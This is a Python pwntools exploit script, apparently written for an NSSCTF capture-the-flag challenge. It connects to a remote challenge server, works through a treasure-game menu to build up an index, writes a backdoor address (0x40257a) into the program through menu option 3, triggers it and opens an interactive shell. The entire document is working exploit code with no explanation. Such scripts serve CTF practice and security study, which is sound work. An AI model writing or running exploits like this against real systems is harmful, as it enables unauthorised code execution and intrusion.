from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


# io=process("./main")
io=remote("node3.anna.nssctf.cn",28145)

bk_door=0x40257a

ct=0

def shell():
    io.recvuntil(b">> ")
    io.sendline(b"1")
    io.recvuntil(b"...\n")
    tmp=io.recvline()
    print(tmp)
    if b"undiscovered treasure" in tmp:
        global ct
        ct=ct+1
        io.sendlineafter(b": ",b"a")
        shell()
    elif b"rare treasure" in tmp:
        io.recvuntil(b">> ")
        io.sendline(b"3")
        io.sendlineafter(b": ",str(ct))
        io.sendlineafter(": ",p64(bk_door))
        io.recvuntil(b">> ")
        io.sendline(b"2")
    elif b"nothing" in tmp:
        shell()

shell()


io.interactive()